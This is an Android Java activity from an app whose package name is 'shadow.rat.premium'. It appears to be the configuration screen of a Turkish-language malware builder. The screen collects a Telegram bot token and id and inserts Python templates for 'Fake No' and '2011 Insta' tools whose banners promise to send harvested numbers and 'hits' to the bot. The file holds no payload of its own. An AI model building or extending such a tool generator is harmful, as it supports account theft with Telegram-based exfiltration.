package shadow.rat.premium;

import android.animation.*;
import android.app.*;
import android.app.AlertDialog;
import android.content.*;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.os.Bundle;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.materialswitch.MaterialSwitch;
import com.google.android.material.textfield.*;
import com.google.firebase.FirebaseApp;
import java.io.*;
import java.io.InputStream;
import java.text.*;
import java.util.*;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;

public class OlusturActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	
	private FloatingActionButton _fab;
	private HashMap<String, Object> map = new HashMap<>();
	private String token = "";
	private String userid = "";
	private String isim = "";
	private String sablon = "";
	
	private LinearLayout linear38;
	private LinearLayout linear39;
	private LinearLayout linear41;
	private ScrollView vscroll1;
	private ImageView imageview2;
	private LinearLayout linear40;
	private TextView textview8;
	private LinearLayout linear42;
	private LinearLayout linear1;
	private LinearLayout linearsablon;
	private LinearLayout linear31;
	private LinearLayout lineartoken;
	private LinearLayout linear8;
	private LinearLayout id;
	private LinearLayout linear15;
	private LinearLayout proje;
	private LinearLayout linear24;
	private LinearLayout linear33;
	private LinearLayout linear34;
	private LinearLayout linear37;
	private LinearLayout linear43;
	private TextView textview7;
	private ImageView imageview3;
	private MaterialSwitch switch1;
	private MaterialSwitch switch2;
	private ImageView imageview4;
	private LinearLayout linear44;
	private TextView textview9;
	private LinearLayout linear4;
	private TextInputLayout textinputlayout4;
	private TextView textview2;
	private EditText edittext1;
	private LinearLayout linear12;
	private TextInputLayout textinputlayout1;
	private TextView textview4;
	private EditText edittext2;
	private LinearLayout linear17;
	private TextInputLayout textinputlayout3;
	private TextView textview5;
	private EditText edittext3;
	
	private Intent intent = new Intent();
	private TimerTask timer;
	private AlertDialog cd;
	private AlertDialog.Builder dialog;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.olustur);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		_fab = findViewById(R.id._fab);
		linear38 = findViewById(R.id.linear38);
		linear39 = findViewById(R.id.linear39);
		linear41 = findViewById(R.id.linear41);
		vscroll1 = findViewById(R.id.vscroll1);
		imageview2 = findViewById(R.id.imageview2);
		linear40 = findViewById(R.id.linear40);
		textview8 = findViewById(R.id.textview8);
		linear42 = findViewById(R.id.linear42);
		linear1 = findViewById(R.id.linear1);
		linearsablon = findViewById(R.id.linearsablon);
		linear31 = findViewById(R.id.linear31);
		lineartoken = findViewById(R.id.lineartoken);
		linear8 = findViewById(R.id.linear8);
		id = findViewById(R.id.id);
		linear15 = findViewById(R.id.linear15);
		proje = findViewById(R.id.proje);
		linear24 = findViewById(R.id.linear24);
		linear33 = findViewById(R.id.linear33);
		linear34 = findViewById(R.id.linear34);
		linear37 = findViewById(R.id.linear37);
		linear43 = findViewById(R.id.linear43);
		textview7 = findViewById(R.id.textview7);
		imageview3 = findViewById(R.id.imageview3);
		switch1 = findViewById(R.id.switch1);
		switch2 = findViewById(R.id.switch2);
		imageview4 = findViewById(R.id.imageview4);
		linear44 = findViewById(R.id.linear44);
		textview9 = findViewById(R.id.textview9);
		linear4 = findViewById(R.id.linear4);
		textinputlayout4 = findViewById(R.id.textinputlayout4);
		textview2 = findViewById(R.id.textview2);
		edittext1 = findViewById(R.id.edittext1);
		linear12 = findViewById(R.id.linear12);
		textinputlayout1 = findViewById(R.id.textinputlayout1);
		textview4 = findViewById(R.id.textview4);
		edittext2 = findViewById(R.id.edittext2);
		linear17 = findViewById(R.id.linear17);
		textinputlayout3 = findViewById(R.id.textinputlayout3);
		textview5 = findViewById(R.id.textview5);
		edittext3 = findViewById(R.id.edittext3);
		dialog = new AlertDialog.Builder(this);
		
		imageview2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				intent.setClass(getApplicationContext(), MenuActivity.class);
				startActivity(intent);
				finish();
			}
		});
		
		imageview3.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				intent.setClass(getApplicationContext(), TemaActivity.class);
				startActivity(intent);
			}
		});
		
		switch1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					sablon = "ascii_art = pyfiglet.figlet_format(\"Fake No\")\n\n".concat("print(ascii_art)\n".concat("print(\"Fake no Tool\")\n".concat("tokenn = input('Token Giriniz: ')\n".concat("idd = input(\"İd Giriniz: \")\n".concat("print(\"Toolu Kapamayin Düşen No lari telegrama atacaktır\")\n\n")))));
					switch2.setEnabled(false);
					
				} else {
					sablon = sablon.concat("\n");
					switch2.setEnabled(true);
					
				}
			}
		});
		
		switch2.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					sablon = "ascii_art = pyfiglet.figlet_format(\"İnsta 11\")\n\n".concat("print(ascii_art)\n".concat("print(\"2011 İnsta Tool\")\n".concat("tokenn = input('Token Giriniz: ')\n".concat("idd = input(\"İd Giriniz: \")\n".concat("print(\"Toolu Kapamayin Hitleri Botunuza Atacak...\")\n\n")))));
					switch1.setEnabled(false);
					
				} else {
					sablon = sablon.concat("\n");
					switch1.setEnabled(true);
					
				}
			}
		});
		
		_fab.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (edittext1.getText().toString().equals("")) {
					((EditText)edittext1).setError("Boş Olamaz!");
				} else {
					if (edittext2.getText().toString().equals("")) {
						((EditText)edittext2).setError("Boş Olamaz!");
					} else {
						if (edittext3.getText().toString().equals("")) {
							((EditText)edittext3).setError("Boş Olamaz!");
						} else {
							token = edittext1.getText().toString();
							userid = edittext2.getText().toString();
							isim = edittext3.getText().toString();
							timer = new TimerTask() {
								@Override
								public void run() {
									runOnUiThread(new Runnable() {
										@Override
										public void run() {
											intent.setClass(getApplicationContext(), ConfigActivity.class);
											intent.putExtra("token", token);
											intent.putExtra("id", userid);
											intent.putExtra("isim", isim);
											intent.putExtra("sablon", sablon);
											startActivity(intent);
											finish();
										}
									});
								}
							};
							_timer.schedule(timer, (int)(1000));
						}
					}
				}
			}
		});
	}
	
	private void initializeLogic() {
		linearsablon.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)45, (int)2, 0xFF212121, 0xFF212121));
		lineartoken.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)45, (int)2, 0xFF212121, 0xFF212121));
		id.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)45, (int)2, 0xFF212121, 0xFF212121));
		proje.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)45, (int)2, 0xFF212121, 0xFF212121));
		switch1.setEnabled(false);
		switch2.setEnabled(false);
		
	}
	
	@Override
	public void onStart() {
		super.onStart();
		sablon = getIntent().getStringExtra("sablon");
	}
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}
}